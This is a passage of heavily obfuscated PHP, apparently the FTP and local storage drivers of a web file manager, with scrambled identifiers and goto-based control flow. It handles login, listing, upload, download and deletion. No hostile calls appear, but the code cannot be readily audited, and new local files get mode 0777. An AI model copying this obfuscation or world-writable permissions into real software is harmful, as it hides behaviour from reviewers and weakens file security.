$eˆïñ‰¥Çë =& $_SERVER[ä°„ä°º]; global $config; $this->appCharset = $config[$eˆïñ‰¥Çë[1263]]; $this->systemCharset = $config[$eˆïñ‰¥Çë[1264]]; if (isset($e‰íÚ›¬¢[$eˆïñ‰¥Çë[1265]]) && $e‰íÚ›¬¢[$eˆïñ‰¥Çë[1265]]) { $this->systemCharset = $e‰íÚ›¬¢[$eˆïñ‰¥Çë[1265]]; } } public function iconvApp($b©Êí¶È ) { return $this->iconvTo($b©Êí¶È , $this->systemCharset, $this->appCharset); } public function iconvSystem($DÇÇ§²ó‹Ô) { return $this->iconvTo($DÇÇ§²ó‹Ô, $this->appCharset, $this->systemCharset); } public function getPathOuter($cÅÖá«²Ã•) { goto a±¹¿±†Ê’; FÏƒ—Çƒ¢¸: return $this->pathDriver . $f˜›Ğç­ê³[8] . ltrim($cÅÖá«²Ã•, $f˜›Ğç­ê³[8]); goto C¸¨…ïã·; a±¹¿±†Ê’: $f˜›Ğç­ê³ =& $_SERVER[ä°„ä°º]; $B·˜£àö½ = $this->iconvApp($this->pathBase); $cÅÖá«²Ã• = $this->iconvApp($cÅÖá«²Ã•); goto a›¾‘‰ãÑá; a›¾‘‰ãÑá: if (substr($B·˜£àö½, 0, 2) == $f˜›Ğç­ê³[1266]) { $B·˜£àö½ = BASIC_PATH . substr($B·˜£àö½, 2); } if (substr($cÅÖá«²Ã•, 0, 2) == $f˜›Ğç­ê³[1266]) { $cÅÖá«²Ã• = BASIC_PATH . substr($cÅÖá«²Ã•, 2); } $B·˜£àö½ = KodIO::clear($B·˜£àö½); goto f‘«„‰ğö; f‘«„‰ğö: $cÅÖá«²Ã• = KodIO::clear($cÅÖá«²Ã•); $cÅÖá«²Ã• = substr($cÅÖá«²Ã•, strlen($B·˜£àö½)); if (empty($this->pathDriver)) { return $cÅÖá«²Ã•; } goto FÏƒ—Çƒ¢¸; C¸¨…ïã·: } private function _init($F¹ÇÕ‚Î¬× = array()) { $aˆ»Û¿ª =& $_SERVER[ä°„ä°º]; if (!function_exists($aˆ»Û¿ª[1267])) { throw new Exception(LNG($aˆ»Û¿ª[1268])); } $this->config = $F¹ÇÕ‚Î¬×; $this->charsetReset($F¹ÇÕ‚Î¬×); foreach ($F¹ÇÕ‚Î¬× as $F†²¨Óˆ®‚ => $CÎ­Ş¥ŒÍ™) { if (isset($this->{$F†²¨Óˆ®‚})) { $this->{$F†²¨Óˆ®‚} = $CÎ­Ş¥ŒÍ™; } } return $this->_login($F¹ÇÕ‚Î¬×); } private function _login($AñÕ†ŠŠÅ) { goto fŒ¡ÑÔœÎã; fŒ¡ÑÔœÎã: $FŠÆŞĞƒŠ± =& $_SERVER[ä°„ä°º]; static $BÖ§±çÇËÍ = array(); $c–öŸÑÎ§ = md5(json_encode($AñÕ†ŠŠÅ)); goto F‘¡İ¸Ğ‰; aÂÉ¤†¦™Ï: @ftp_set_option($this->connect, FTP_USEPASVADDRESS, !1); $cğñµÙì¸² = $this->pasv == $FŠÆŞĞƒŠ±[87] ? !0 : !1; @ftp_pasv($this->connect, $cğñµÙì¸²); goto Bã…®Š¶ªî; Bã…®Š¶ªî: $BÖ§±çÇËÍ[$c–öŸÑÎ§] = array($FŠÆŞĞƒŠ±[1272] => $this->connect, $FŠÆŞĞƒŠ±[175] => $this->host, $FŠÆŞĞƒŠ±[174] => $this->scheme, $FŠÆŞĞƒŠ±[176] => $this->port); return $A·»²¯š¾Û; goto Fã¬„ÂÑ²; F‘¡İ¸Ğ‰: if (isset($BÖ§±çÇËÍ[$c–öŸÑÎ§])) { foreach ($BÖ§±çÇËÍ[$c–öŸÑÎ§] as $f³Ìê—ôœ¯ => $A¼á…ñ¬é) { $this->{$f³Ìê—ôœ¯} = $A¼á…ñ¬é; } return !0; } $fÑ“¤‘‹¾’ = parse_url(trim($this->server, $FŠÆŞĞƒŠ±[8])); $this->host = $fÑ“¤‘‹¾’[$FŠÆŞĞƒŠ±[175]]; goto e¿°µ‡­À²; e¿°µ‡­À²: $Cœ¹æâ”´ = isset($fÑ“¤‘‹¾’[$FŠÆŞĞƒŠ±[174]]) && $fÑ“¤‘‹¾’[$FŠÆŞĞƒŠ±[174]] == $FŠÆŞĞƒŠ±[1269] ? !0 : !1; $this->scheme = $Cœ¹æâ”´ ? $FŠÆŞĞƒŠ±[1270] : $FŠÆŞĞƒŠ±[1271]; $this->port = isset($fÑ“¤‘‹¾’[$FŠÆŞĞƒŠ±[176]]) ? $fÑ“¤‘‹¾’[$FŠÆŞĞƒŠ±[176]] : 21; goto fµÛ ÇÃÛœ; fµÛ ÇÃÛœ: $this->connect = @ftp_connect($this->host, $this->port, 5); if ($this->connect === !1) { return !1; } $A·»²¯š¾Û = @ftp_login($this->connect, $this->username, $this->userpass); goto aÂÉ¤†¦™Ï; Fã¬„ÂÑ²: } private function _isconn() { if (is_resource($this->connect)) { return !0; } return $this->_login($this->config); } public function mkfile($C¨¿ª•Çë, $AõöØŒ÷¬ = '', $cÚë‰õ¥õ = REPEAT_RENAME) { if ($this->setContent($C¨¿ª•Çë, $AõöØŒ÷¬)) { return $this->getPathOuter($C¨¿ª•Çë); } return !1; } public function mkdir($Bê¸ùóäŒ, $e—¡×Òß¸ = REPEAT_SKIP) { if (!$this->_isconn()) { return !1; } $Bê¸ùóäŒ = $this->iconvSystem($Bê¸ùóäŒ); if ($this->_isFolder($Bê¸ùóäŒ) || @ftp_mkdir($this->connect, $Bê¸ùóäŒ)) { return $this->getPathOuter($Bê¸ùóäŒ); } if (!$this->mkdir($this->pathFather($Bê¸ùóäŒ))) { return !1; } if ($Bê¸ùóäŒ = @ftp_mkdir($this->connect, $Bê¸ùóäŒ)) { return $this->getPathOuter($Bê¸ùóäŒ); } return !1; } public function copyFile($BÑããİ‘™°, $dÜ—âñàÖ±) { goto BšæÏÅ‡Ä”; E‹¹¦ÈÈ¦: $DåÂºÖ…Ó = $this->iconvApp($f‹Â‰ŠŠ†‡); $this->download($BÑããİ‘™°, $DåÂºÖ…Ó); $Bß‚ÓÕÖ† = $this->upload($dÜ—âñàÖ±, $DåÂºÖ…Ó); goto a‚¦äˆÆÑõ; BšæÏÅ‡Ä”: if (!$this->_isconn()) { return !1; } $e¯±Ü×§„¹ = $this->pathThis($this->iconvSystem($BÑããİ‘™°)); $f‹Â‰ŠŠ†‡ = $this->tempFile($e¯±Ü×§„¹); goto E‹¹¦ÈÈ¦; a‚¦äˆÆÑõ: $this->tempFileRemve($f‹Â‰ŠŠ†‡); return $Bß‚ÓÕÖ†; goto F¹èäœÖ‰£; F¹èäœÖ‰£: } public function moveFile($DöÈòƒæ†, $EÔÊ “òÄ¿) { if (!$this->_isconn()) { return !1; } $DöÈòƒæ† = $this->iconvSystem($DöÈòƒæ†); $EÔÊ “òÄ¿ = $this->iconvSystem($EÔÊ “òÄ¿); $dê£òí½­ = @ftp_rename($this->connect, $DöÈòƒæ†, $EÔÊ “òÄ¿); return $dê£òí½­ ? $this->getPathOuter($EÔÊ “òÄ¿) : !1; } public function delFile($Bå³·ÖçÑË) { if (!$this->_isconn()) { return !1; } $Bå³·ÖçÑË = $this->iconvSystem($Bå³·ÖçÑË); return @ftp_delete($this->connect, $Bå³·ÖçÑË); } public function delFolder($CåíÎé…¬İ) { goto bèÚâÜÊìâ; D˜É×Ÿœ’®: foreach ($E¢á¬Âäµ³ as $cº‘–ëìğ×) { $cº‘–ëìğ× = $this->iconvSystem($cº‘–ëìğ×); $c°¬Ú “ = @ftp_rmdir($this->connect, $cº‘–ëìğ×); if (!$c°¬Ú “) { return !1; } } $CåíÎé…¬İ = $this->iconvSystem($CåíÎé…¬İ); return @ftp_rmdir($this->connect, $CåíÎé…¬İ); goto D÷È°–§Ù; bèÚâÜÊìâ: if (!$this->_isconn()) { return !1; } $this->listItemCache = !1; $E¢á¬Âäµ³ = $e«âßÃ•³ = array(); goto D£ĞÖ˜Ÿ; D£ĞÖ˜Ÿ: $this->fileList($CåíÎé…¬İ, $E¢á¬Âäµ³, $e«âßÃ•³, !0); $this->listItemCache = !0; foreach ($e«âßÃ•³ as $c‡‰÷ñª‘) { $cº‘–ëìğ× = $this->iconvSystem($c‡‰÷ñª‘[$_SERVER[ä°„ä°º][28]]); $c°¬Ú “ = @ftp_delete($this->connect, $cº‘–ëìğ×); if (!$c°¬Ú “) { return !1; } } goto D˜É×Ÿœ’®; D÷È°–§Ù: } public function rename($f…Ñé¡ğêì, $e£à’‚Ïå) { goto dÄ§•ŒÉÏ; dÄ§•ŒÉÏ: $b‹ê°¸œ¶³ =& $_SERVER[ä°„ä°º]; if (!$this->_isconn()) { return !1; } $C÷ã“óÆ›Ò = $this->fileNameAuto($this->pathFather($f…Ñé¡ğêì), $e£à’‚Ïå); goto C¨ÕØ÷­¤Ÿ; e©ÍÖÍ…Œ: $fèË¢äçô = rtrim($bŸ˜¹Èğ×ó, $b‹ê°¸œ¶³[8]) . $b‹ê°¸œ¶³[8] . $C÷ã“óÆ›Ò; $B”Â©¡ÊÌÆ = @ftp_rename($this->connect, $f…Ñé¡ğêì, $fèË¢äçô); $fèË¢äçô = $this->iconvApp($fèË¢äçô); goto AÈÜ¤òùá; C¨ÕØ÷­¤Ÿ: $C÷ã“óÆ›Ò = $this->iconvSystem($C÷ã“óÆ›Ò); $f…Ñé¡ğêì = $this->iconvSystem($f…Ñé¡ğêì); $bŸ˜¹Èğ×ó = $this->pathFather($f…Ñé¡ğêì); goto e©ÍÖÍ…Œ; AÈÜ¤òùá: return $B”Â©¡ÊÌÆ ? $this->getPathOuter($fèË¢äçô) : !1; goto a´¦‹»‹ÑŠ; a´¦‹»‹ÑŠ: } private function folderInfo($EÆô¯¤Åİ«, $DØ¸äÔºÈô = false) { $Cë‡õ¶Ø =& $_SERVER[ä°„ä°º]; $b×ñ÷¡“›” = array($Cë‡õ¶Ø[28] => $this->pathThis($EÆô¯¤Åİ«), $Cë‡õ¶Ø[76] => $this->getPathOuter($Cë‡õ¶Ø[8] . $EÆô¯¤Åİ«), $Cë‡õ¶Ø[29] => $Cë‡õ¶Ø[77]); if ($DØ¸äÔºÈô) { return $b×ñ÷¡“›”; } $b×ñ÷¡“›”[$Cë‡õ¶Ø[194]] = $b×ñ÷¡“›”[$Cë‡õ¶Ø[84]] = 0; $b×ñ÷¡“›”[$Cë‡õ¶Ø[195]] = $b×ñ÷¡“›”[$Cë‡õ¶Ø[196]] = !0; return $b×ñ÷¡“›”; } private function fileInfo($FÏÕÄ“Õ¿¨, $a½„î†ğ¹¢ = false, $aòÎŠëÜ ¨ = array()) { goto bê•°³¿Ê­; cò¦¸ªÔ¥æ: return $BÕÙµçŠá¦; goto aÌ¹½ßÚ‘“; dŞÊÆ¬»È: $BÕÙµçŠá¦[$BêàÀ‰Û[84]] = @ftp_mdtm($this->connect, $AŒæóî²ì»); if (empty($aòÎŠëÜ ¨)) { $aòÎŠëÜ ¨ = $this->objectMeta($FÏÕÄ“Õ¿¨); if (!$aòÎŠëÜ ¨) { return $BÕÙµçŠá¦; } } $BÕÙµçŠá¦[$BêàÀ‰Û[78]] = $aòÎŠëÜ ¨[$BêàÀ‰Û[78]]; goto cò¦¸ªÔ¥æ; bê•°³¿Ê­: $BêàÀ‰Û =& $_SERVER[ä°„ä°º]; $BÕÙµçŠá¦ = array($BêàÀ‰Û[28] => $this->pathThis($FÏÕÄ“Õ¿¨), $BêàÀ‰Û[76] => $this->getPathOuter($BêàÀ‰Û[8] . $FÏÕÄ“Õ¿¨), $BêàÀ‰Û[29] => $BêàÀ‰Û[193], $BêàÀ‰Û[78] => isset($aòÎŠëÜ ¨[$BêàÀ‰Û[78]]) ? $aòÎŠëÜ ¨[$BêàÀ‰Û[78]] : 0, $BêàÀ‰Û[168] => $this->ext($FÏÕÄ“Õ¿¨)); if ($a½„î†ğ¹¢) { return $BÕÙµçŠá¦; } goto dÉ³„àÚ¹»; dÉ³„àÚ¹»: $BÕÙµçŠá¦[$BêàÀ‰Û[194]] = $BÕÙµçŠá¦[$BêàÀ‰Û[84]] = 0; $BÕÙµçŠá¦[$BêàÀ‰Û[195]] = $BÕÙµçŠá¦[$BêàÀ‰Û[196]] = !0; $AŒæóî²ì» = $this->iconvSystem($FÏÕÄ“Õ¿¨); goto dŞÊÆ¬»È; aÌ¹½ßÚ‘“: } public function size($DÌ¾…Æê¤˜) { $b‹”Ş¶¶„ = $this->objectMeta($DÌ¾…Æê¤˜); return $b‹”Ş¶¶„ ? $b‹”Ş¶¶„[$_SERVER[ä°„ä°º][78]] : 0; } public function info($dšù¨Ãµ¢Œ) { if ($this->isFile($dšù¨Ãµ¢Œ)) { return $this->fileInfo($dšù¨Ãµ¢Œ, 0); } else { if ($this->isFolder($dšù¨Ãµ¢Œ)) { return $this->folderInfo($dšù¨Ãµ¢Œ); } } return !1; } private function fileList($bÀÑ‡ë‹Òò, &$AÙÒ¦§Ô©, &$d˜é¬Äƒá¾, $ašŸ®¹êÆ† = false) { goto Aö¬¶Ëºí; Aö¬¶Ëºí: $EóÄ¤¢‚±± =& $_SERVER[ä°„ä°º]; $bÀÑ‡ë‹Òò = $this->iconvSystem($bÀÑ‡ë‹Òò); if (!$this->isFolder($bÀÑ‡ë‹Òò)) { return !1; } goto Aˆ±÷…†±; Aˆ±÷…†±: @ftp_chdir($this->connect, $EóÄ¤¢‚±±[8]); $bÀÑ‡ë‹Òò = rtrim($bÀÑ‡ë‹Òò, $EóÄ¤¢‚±±[8]) . $EóÄ¤¢‚±±[8]; check_abort(); goto DÆÌŞš½˜ˆ; DÆÌŞš½˜ˆ: $eàÔ¡§‚À… = $this->listItemCache === !1 ? !1 : !0; $F®®¢­ÓŒ = @ftp_rawlist($this->connect, $bÀÑ‡ë‹Òò); if (!$F®®¢­ÓŒ) { $F®®¢­ÓŒ = array(); } goto bàÔ…óùœ¦; bàÔ…óùœ¦: $bË„¸ƒ¥ = array($EóÄ¤¢‚±±[95] => 1, $EóÄ¤¢‚±±[1273] => 1); foreach ($F®®¢­ÓŒ as $Dò¹ †ƒ‡) { goto d›¿´™İË; DŒàõ‹õèÈ: if (empty($f“ƒ¨†œ) && $f“ƒ¨†œ !== $EóÄ¤¢‚±±[191] || isset($bË„¸ƒ¥[$f“ƒ¨†œ])) { continue; } $f“ƒ¨†œ = $this->iconvApp($bÀÑ‡ë‹Òò . ltrim($f“ƒ¨†œ, $EóÄ¤¢‚±±[8])); $eÀğ•‰Ò×Ë = array($EóÄ¤¢‚±±[28] => $f“ƒ¨†œ, $EóÄ¤¢‚±±[29] => $EóÄ¤¢‚±±[193], $EóÄ¤¢‚±±[78] => $FöÒÏØÕ¦Ğ[4]); goto bñÍÒç‚œ; bñÍÒç‚œ: if (substr($Dò¹ †ƒ‡, 0, 1) == $EóÄ¤¢‚±±[1274]) { $eÀğ•‰Ò×Ë[$EóÄ¤¢‚±±[29]] = $EóÄ¤¢‚±±[77]; $eÀğ•‰Ò×Ë[$EóÄ¤¢‚±±[78]] = 0; } $b×ÇÆ™„¹Ÿ = $eÀğ•‰Ò×Ë[$EóÄ¤¢‚±±[29]] == $EóÄ¤¢‚±±[77] ? !0 : !1; if ($eàÔ¡§‚À…) { $this->cacheMethod($EóÄ¤¢‚±±[199], $f“ƒ¨†œ, $b×ÇÆ™„¹Ÿ); $this->cacheMethod($EóÄ¤¢‚±±[200], $f“ƒ¨†œ, $eÀğ•‰Ò×Ë); } goto b‹†æïùéÕ; d›¿´™İË: $FöÒÏØÕ¦Ğ = $this->_listItem($Dò¹ †ƒ‡); if ($FöÒÏØÕ¦Ğ[0] == $EóÄ¤¢‚±±[742]) { continue; } $f“ƒ¨†œ = $FöÒÏØÕ¦Ğ[8]; goto DŒàõ‹õèÈ; b‹†æïùéÕ: if ($b×ÇÆ™„¹Ÿ) { $AÙÒ¦§Ô©[] = $f“ƒ¨†œ; if ($ašŸ®¹êÆ†) { $this->fileList($f“ƒ¨†œ, $AÙÒ¦§Ô©, $d˜é¬Äƒá¾, $ašŸ®¹êÆ†); } continue; } $d˜é¬Äƒá¾[] = $eÀğ•‰Ò×Ë; goto Bå…½ÔÒµí; Bå…½ÔÒµí: } if ($eàÔ¡§‚À…) { $this->cacheMethod($EóÄ¤¢‚±±[199], $bÀÑ‡ë‹Òò, !0); } goto b£µĞÓõåá; b£µĞÓõåá: } private function _listItem($báÖÚÄßöÎ) { if (empty($báÖÚÄßöÎ)) { return array(); } $CÖ½µÒæ®¢ = preg_split($_SERVER[ä°„ä°º][1275], $báÖÚÄßöÎ); if (count($CÖ½µÒæ®¢) <= 9) { return $CÖ½µÒæ®¢; } $CÖ½µÒæ®¢[8] = trim(substr($báÖÚÄßöÎ, strpos($báÖÚÄßöÎ, $CÖ½µÒæ®¢[7]) + strlen($CÖ½µÒæ®¢[7]))); return array_splice($CÖ½µÒæ®¢, 0, 9); } public function listPath($bÉèĞƒéŒê, $f‹£¹ƒçª = false) { goto C‰’ğ‹ËË„; FÁ­ÈÔÒì: $this->fileList($bÉèĞƒéŒê, $aó˜äÒ™ŞĞ, $e¿Ë¥éó±); foreach ($aó˜äÒ™ŞĞ as $Bî®º°ô•Æ => $A¸Ü×åŞ®ç) { $aó˜äÒ™ŞĞ[$Bî®º°ô•Æ] = $this->folderInfo($A¸Ü×åŞ®ç, $f‹£¹ƒçª); } foreach ($e¿Ë¥éó± as $Bî®º°ô•Æ => $A¸Ü×åŞ®ç) { $e¿Ë¥éó±[$Bî®º°ô•Æ] = $this->fileInfo($A¸Ü×åŞ®ç[$A‹´ƒä¼ë[28]], $f‹£¹ƒçª, $A¸Ü×åŞ®ç); } goto CŞ¬½ê±§; CŞ¬½ê±§: return array($A‹´ƒä¼ë[75] => $aó˜äÒ™ŞĞ, $A‹´ƒä¼ë[74] => $e¿Ë¥éó±); goto DìíÇ§¥‡à; C‰’ğ‹ËË„: $A‹´ƒä¼ë =& $_SERVER[ä°„ä°º]; if (!$this->_isconn()) { return !1; } $aó˜äÒ™ŞĞ = $e¿Ë¥éó± = array(); goto FÁ­ÈÔÒì; DìíÇ§¥‡à: } public function has($eÔİÂˆ…õ, $EëœÏéâÛŒ = false, $C«Ô‰’ä™æ = true) { goto a†Ú‡÷‚¼; cÕŸÓ±Ùí: return !1; goto EÜÈÊ³…ê´; b®‰”òÍàï: $this->fileList($eÔİÂˆ…õ, $E”¸¸Šîôó, $eæ¹ƒ‘¸Ë, $Aù¥Ô—éŸ); if ($EëœÏéâÛŒ) { return array($BîÕ®ñÊ[203] => count($eæ¹ƒ‘¸Ë), $BîÕ®ñÊ[204] => count($E”¸¸Šîôó)); } if ($C«Ô‰’ä™æ) { if (count($eæ¹ƒ‘¸Ë)) { return !0; } } else { if (count($E”¸¸Šîôó)) { return !0; } } goto cÕŸÓ±Ùí; a†Ú‡÷‚¼: $BîÕ®ñÊ =& $_SERVER[ä°„ä°º]; $E”¸¸Šîôó = $eæ¹ƒ‘¸Ë = array(); $Aù¥Ô—éŸ = $EëœÏéâÛŒ ? !0 : !1; goto b®‰”òÍàï; EÜÈÊ³…ê´: } public function listAll($b©‘–Àˆ¦) { goto D­¦Æåñ˜…; dÊ‚å™è: foreach ($b”³Ÿš³ù as $fİßç‘) { if (is_string($fİßç‘)) { $D“¢—÷ÓÃ[$fİßç‘] = 0; } } return $this->listAllFiles($b©‘–Àˆ¦, array_keys($D“¢—÷ÓÃ), $D“¢—÷ÓÃ); goto a±ÃÏÎ‡¼; E‚«§‰ĞÊ—: $this->fileList($b©‘–Àˆ¦, $b”³Ÿš³ù, $BÑœ™Ë´Ò, !0); $D“¢—÷ÓÃ = array(); foreach ($BÑœ™Ë´Ò as $fİßç‘) { $D“¢—÷ÓÃ[$fİßç‘[$BÛ²çÃÔÊ[28]]] = $fİßç‘[$BÛ²çÃÔÊ[78]]; } goto dÊ‚å™è; D­¦Æåñ˜…: $BÛ²çÃÔÊ =& $_SERVER[ä°„ä°º]; if (!$this->_isconn()) { return !1; } $b”³Ÿš³ù = $BÑœ™Ë´Ò = array(); goto E‚«§‰ĞÊ—; a±ÃÏÎ‡¼: } public function getContent($e‹£ø’ñÒ) { if (!$this->_isconn()) { return !1; } $e‹£ø’ñÒ = $this->iconvSystem($e‹£ø’ñÒ); return $this->fileSubstr($e‹£ø’ñÒ); } public function setContent($D’Ö·–ó–¬, $a–ù¯á¥ò = '') { goto CÔë¼¶¹‘ö; CÔë¼¶¹‘ö: if (!$this->_isconn()) { return !1; } $eé…Şî™¾± = $this->pathThis($this->iconvSystem($D’Ö·–ó–¬)); $f ×–Íëµí = $this->tempFile($eé…Şî™¾±); goto E®Ê’à²…; E®Ê’à²…: file_put_contents($f ×–Íëµí, $a–ù¯á¥ò); $c«â¸ˆê‹î = $this->upload($D’Ö·–ó–¬, $this->iconvApp($f ×–Íëµí)); $this->tempFileRemve($f ×–Íëµí); goto AŒÅ“ÀØÍ; AŒÅ“ÀØÍ: return $c«â¸ˆê‹î; goto c‘¡¢”µïÎ; c‘¡¢”µïÎ: } public function fileSubstr($Dáã×à„‘”, $d‘ÀÇ–È´é = 0, $Fƒ—éÜœ¾Â = false) { if (!$this->_isconn()) { return !1; } return $this->ftpRequest($Dáã×à„‘”, $d‘ÀÇ–È´é, $Fƒ—éÜœ¾Â); } private function ftpRequest($f²Â…Êù‘¹, $Eºää‰ŞŸ = 0, $c£Û«µ·¡† = false) { goto fò¬»¡ìê; fã…˜æÔ¾İ: return $Bï¬¼Ä­…‘; goto D´Í´®¾¶; FÌç¾ãàºÛ: curl_setopt($aŸ‹…çŒÃ¾, CURLOPT_RETURNTRANSFER, 1); $Bï¬¼Ä­…‘ = curl_exec($aŸ‹…çŒÃ¾); curl_close($aŸ‹…çŒÃ¾); goto fã…˜æÔ¾İ; aùÂ»›•²×: curl_setopt($aŸ‹…çŒÃ¾, CURLOPT_URL, $EÌ‡’÷ª‚ˆ . $this->pathEncode($f²Â…Êù‘¹)); curl_setopt($aŸ‹…çŒÃ¾, CURLOPT_USERPWD, "{$this->username}\x3a{$this->userpass}"); if ($c£Û«µ·¡†) { $dß˜ŒƒšÍ = $Eºää‰ŞŸ + $c£Û«µ·¡† - 1; curl_setopt($aŸ‹…çŒÃ¾, CURLOPT_RANGE, "{$Eºää‰ŞŸ}\55{$dß˜ŒƒšÍ}"); } goto FÌç¾ãàºÛ; fò¬»¡ìê: $f²Â…Êù‘¹ = $this->iconvSystem($f²Â…Êù‘¹); $EÌ‡’÷ª‚ˆ = $this->scheme . $this->host . $_SERVER[ä°„ä°º][4] . $this->port; $aŸ‹…çŒÃ¾ = curl_init(); goto aùÂ»›•²×; D´Í´®¾¶: } public function upload($DÆÎ¯â²šš, $CÂ˜¶ƒÎ, $dì…°åÆœ = false, $C¤‰‰ÙòµÊ = REPEAT_REPLACE) { goto câÖâĞÜ°; câÖâĞÜ°: if (!$this->_isconn()) { return !1; } if (!$this->mkdir($this->pathFather($DÆÎ¯â²šš))) { return !1; } $DÆÎ¯â²šš = $this->iconvSystem($DÆÎ¯â²šš); goto DÎëóØ‹; DÎëóØ‹: $CÂ˜¶ƒÎ = $this->iconvSystem($CÂ˜¶ƒÎ); $EÕ¡íñ‚ÜÊ = ftp_nb_put($this->connect, $DÆÎ¯â²šš, $CÂ˜¶ƒÎ, FTP_BINARY); while ($EÕ¡íñ‚ÜÊ == FTP_MOREDATA) { $EÕ¡íñ‚ÜÊ = ftp_nb_continue($this->connect); } goto Eöñ¢ĞÖœ; Eöñ¢ĞÖœ: if ($EÕ¡íñ‚ÜÊ != FTP_FINISHED) { return !1; } return $this->getPathOuter($DÆÎ¯â²šš); goto B¿‹­¢…êÖ; B¿‹­¢…êÖ: } public function download($AŒ…´áğ‰¯, $eäÔà¡«Ñì = '') { goto E†¦¨©‹ğ°; E†¦¨©‹ğ°: if (!$this->_isconn()) { return !1; } $C‚éäÃÛ†î = $this->pathFather($eäÔà¡«Ñì); if (!IO::mkdir($C‚éäÃÛ†î)) { return !1; } goto cø´ÑÇîî; eŞ÷Íßï½Ï: while ($C‘Æ´¹îôë == FTP_MOREDATA) { $C‘Æ´¹îôë = ftp_nb_continue($this->connect); } if ($C‘Æ´¹îôë != FTP_FINISHED) { return !1; } return $this->iconvApp($eäÔà¡«Ñì); goto AºŒƒò®–Ù; cø´ÑÇîî: $AŒ…´áğ‰¯ = $this->iconvSystem($AŒ…´áğ‰¯); $eäÔà¡«Ñì = $this->iconvSystem($eäÔà¡«Ñì); $C‘Æ´¹îôë = ftp_nb_get($this->connect, $eäÔà¡«Ñì, $AŒ…´áğ‰¯, FTP_BINARY); goto eŞ÷Íßï½Ï; AºŒƒò®–Ù: } public function exist($c—ôñ´“©£) { return $this->isFile($c—ôñ´“©£) || $this->isFolder($c—ôñ´“©£); } public function isFile($BÔÃŸÊˆÄ) { return !$this->isFolder($BÔÃŸÊˆÄ) && $this->objectMeta($BÔÃŸÊˆÄ); } public function isFolder($D†ÂŒ¥Åå») { return $this->cacheMethod($_SERVER[ä°„ä°º][199], $D†ÂŒ¥Åå»); } protected function objectMeta($C·äèĞ’†) { return $this->cacheMethod($_SERVER[ä°„ä°º][200], $C·äèĞ’†); } protected function _objectMeta($e³¦é©©³™) { goto EÎõÃöåŞ’; EÎõÃöåŞ’: $e†âîß¸å =& $_SERVER[ä°„ä°º]; if ($e³¦é©©³™ == $e†âîß¸å[33] || $e³¦é©©³™ == $e†âîß¸å[8]) { return array(); } if (!$this->_isconn()) { return !1; } goto bŸ ãğ™‘Ò; bŸ ãğ™‘Ò: $e³¦é©©³™ = $this->iconvSystem($e³¦é©©³™); $E…ˆ¼Ñ®ˆ = array($e†âîß¸å[28] => $this->iconvApp($e³¦é©©³™), $e†âîß¸å[29] => $e†âîß¸å[193], $e†âîß¸å[78] => 0); @ftp_chdir($this->connect, $e†âîß¸å[8]); goto fæÅˆõ‹„°; fæÅˆõ‹„°: $Eºˆàõö©ë = @ftp_size($this->connect, $e³¦é©©³™); if ($Eºˆàõö©ë != -1) { $E…ˆ¼Ñ®ˆ[$e†âîß¸å[78]] = $Eºˆàõö©ë; } else { $A§šÍ¦ºøë = @ftp_chdir($this->connect, $e³¦é©©³™); if (!$A§šÍ¦ºøë) { return !1; } $E…ˆ¼Ñ®ˆ[$e†âîß¸å[29]] = $e†âîß¸å[77]; } return $E…ˆ¼Ñ®ˆ; goto bŒù—ë‰ÛØ; bŒù—ë‰ÛØ: } protected function _isFolder($aÖ£Ì„ÍÙ) { $f‘¤ùë¦Í© =& $_SERVER[ä°„ä°º]; if ($aÖ£Ì„ÍÙ == $f‘¤ùë¦Í©[33] || $aÖ£Ì„ÍÙ == $f‘¤ùë¦Í©[8]) { return !0; } $eÄ¾·Å¯ö¬ = $this->_objectMeta($aÖ£Ì„ÍÙ); return isset($eÄ¾·Å¯ö¬[$f‘¤ùë¦Í©[29]]) && $eÄ¾·Å¯ö¬[$f‘¤ùë¦Í©[29]] == $f‘¤ùë¦Í©[77] ? !0 : !1; } } class PathDriverLocal extends PathDriverBase { public function __construct() { parent::__construct(); } public function getPath($eô‘¢Úâ¦¨) { if (substr($eô‘¢Úâ¦¨, 0, 2) == $_SERVER[ä°„ä°º][1266]) { $eô‘¢Úâ¦¨ = BASIC_PATH . substr($eô‘¢Úâ¦¨, 2); } return $eô‘¢Úâ¦¨; } public function iconvApp($fÑ•°ÒùŒ) { $cªåˆÜíá˜ =& $_SERVER[ä°„ä°º]; global $config; return $this->iconvTo($fÑ•°ÒùŒ, $config[$cªåˆÜíá˜[1264]], $config[$cªåˆÜíá˜[1263]]); } public function iconvSystem($Dè®¤‹²—å) { $DæÃŸ¢ÜÄ‚ =& $_SERVER[ä°„ä°º]; global $config; return $this->iconvTo($Dè®¤‹²—å, $config[$DæÃŸ¢ÜÄ‚[1263]], $config[$DæÃŸ¢ÜÄ‚[1264]]); } public function getPathOuter($d¼„öÈ‡êõ) { goto C¶¦Áô…í›; b¾ì›Ñ…¶‹: if (substr($EİÄ›ï¶¤Ê, 0, 2) == $a¢³±Œ¤¢Å[1266]) { $EİÄ›ï¶¤Ê = BASIC_PATH . substr($EİÄ›ï¶¤Ê, 2); } if (substr($d¼„öÈ‡êõ, 0, 2) == $a¢³±Œ¤¢Å[1266]) { $d¼„öÈ‡êõ = BASIC_PATH . substr($d¼„öÈ‡êõ, 2); } $EİÄ›ï¶¤Ê = KodIO::clear($EİÄ›ï¶¤Ê); goto A»Æƒã–»ö; A»Æƒã–»ö: $d¼„öÈ‡êõ = KodIO::clear($d¼„öÈ‡êõ); $d¼„öÈ‡êõ = substr($d¼„öÈ‡êõ, strlen($EİÄ›ï¶¤Ê)); if (empty($this->pathDriver)) { return $d¼„öÈ‡êõ; } goto fí¼Î³í‡; fí¼Î³í‡: return $this->pathDriver . $a¢³±Œ¤¢Å[8] . ltrim($d¼„öÈ‡êõ, $a¢³±Œ¤¢Å[8]); goto d­‰Şµ¥·; C¶¦Áô…í›: $a¢³±Œ¤¢Å =& $_SERVER[ä°„ä°º]; $EİÄ›ï¶¤Ê = $this->iconvApp($this->pathBase); $d¼„öÈ‡êõ = $this->iconvApp($d¼„öÈ‡êõ); goto b¾ì›Ñ…¶‹; d­‰Şµ¥·: } public function mkfile($d£”èã” á, $FÊ»ÜíÆó = '', $e§„É†—çÇ = REPEAT_RENAME) { $d£”èã” á = $this->iconvSystem($d£”èã” á); @touch($d£”èã” á); if ($FÊ»ÜíÆó) { file_put_contents($d£”èã” á, $FÊ»ÜíÆó); } @chmod($d£”èã” á, 511); return is_file($d£”èã” á) ? $this->getPathOuter($d£”èã” á) : !1; } public function mkdir($d’Á²ÒÀ›½, $fõÂÒ§Õ” = REPEAT_SKIP) { $d’Á²ÒÀ›½ = $this->iconvSystem($d’Á²ÒÀ›½); if 